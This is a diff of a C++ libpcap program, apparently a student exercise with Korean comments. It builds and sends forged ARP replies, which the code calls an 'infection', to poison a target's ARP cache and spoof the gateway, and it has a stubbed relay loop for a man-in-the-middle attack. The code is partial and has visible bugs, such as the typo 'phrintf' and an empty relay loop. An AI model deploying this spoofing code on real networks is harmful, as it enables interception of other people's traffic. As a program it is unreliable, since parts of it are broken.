@@ -51,7 +51,6 @@ int main(int argc, char *argv[])
     Mac mymac;
     mymac=mm;
 //-------------------------------------------------------------- get my ip!!
-
     FILE *b;
     b=popen("ip addr | grep 'inet' | grep brd | awk '{printf $2}' | awk -F/ ' {printf $1}'","r");
     char mip[16];
@@ -124,11 +123,12 @@ int main(int argc, char *argv[])
     }
     pcap_sendpacket(ph,(u_char*)rq_packet,42);
 
-    /*
+/*
     if(pcap_sendpacket(ph,(u_char*)rq_packet,42) != 0)
     {
         phrintf(stderr,"\n Error sending the packet:\n",pcap_geterr(ph));
-    }*/
+    }
+*/
 
 
 
@@ -211,23 +211,31 @@ int main(int argc, char *argv[])
             if(repl==1)
             {
                 make_t_mac(gate_data,gatemac,argv[2]); // get reply data -> target mac //<-ho temp
+               break;  //<-fix
             }
-            break;  //<-fix
+            else if(repl==0)
+            {
+                printf("Time out error\n");
+                continue;
+            }
+            else if(repl==-1)
+            {
+                printf("ERROR\n");
+            }
+            else if(repl==-2)
+            {
+                printf("End of File\n");
+            }
+            else
+                break;  //<-fix at here
         }
         pcap_close(ph);
 
 //-//////////////////////////////////////////////////////infection reply start//////////////////////////////////////////////////////////////
 
-
-//--------------------------------------------------------------------------------------ethernet protocol
-        u_int16_t ether_type=htons(0x0806);
 //---------------------------------------------------------------------------------------arp protocol
         struct makearphdr ap;
 
-        ap.ar_hrd = htons(0x0001);
-        ap.ar_pro = htons(0x0800);
-        ap.ar_hln = 0x06;
-        ap.ar_pln = 0x04;
         ap.ar_op  = htons(0x0002);
 
         char *arp_sip = argv[2];
@@ -243,11 +251,11 @@ int main(int argc, char *argv[])
         memset(packet,0,42);
         memcpy(packet,&tm,6);
         memcpy(packet+6,&mymac,6);
-        memcpy(packet+12,&ether_type,2);
-        memcpy(packet+14,&ap.ar_hrd,2);
-        memcpy(packet+16,&ap.ar_pro,2);
-        memcpy(packet+18,&ap.ar_hln,1);
-        memcpy(packet+19,&ap.ar_pln,1);
+        memcpy(packet+12,&etype,2);
+        memcpy(packet+14,&rq.ar_hrd,2);
+        memcpy(packet+16,&rq.ar_pro,2);
+        memcpy(packet+18,&rq.ar_hln,1);
+        memcpy(packet+19,&rq.ar_pln,1);
         memcpy(packet+20,&ap.ar_op,2);
         memcpy(packet+22,&mymac,6);
         memcpy(packet+28,&s_ip,4);
@@ -265,24 +273,21 @@ int main(int argc, char *argv[])
             return 0;
         }
         //---------------------------------------------------------------------------------------send relay
-/*                                                                    <-start here
-       int relay;
-        while((relay=pcap_next_ex(ph, &header, &pkt_data))>=0)
+                                                                   //<-start here
+        int s_vic;//send victim
+        while((s_vic=pcap_next_ex(ph, &header, &pkt_data))>=0)
         {
-            if(relay==1)
-            {
-                pcap_sendpacket(ph,pkt_data,sizeof(pkt_data));
-            }
-            else if(relay==0)
-                continue;
+            
         }
-*/
+
+
+
+
         //----------------------------------------------------------send infection
         std :: thread infect(&infect_start,ph,packet);
         //here in relay;
         infect.join();
 
-         pcap_close(ph);
 
 
 }
@@ -304,6 +309,7 @@ void make_t_mac(const u_char *pkt_data, u_int8_t a[], char *b)//아이피를 비
         memcpy(a,((struct ether_header *)pkt_data)->ether_shost,6);
     }
 }
+
 
 void infect_start(pcap_t *a,uint8_t b[])
 {
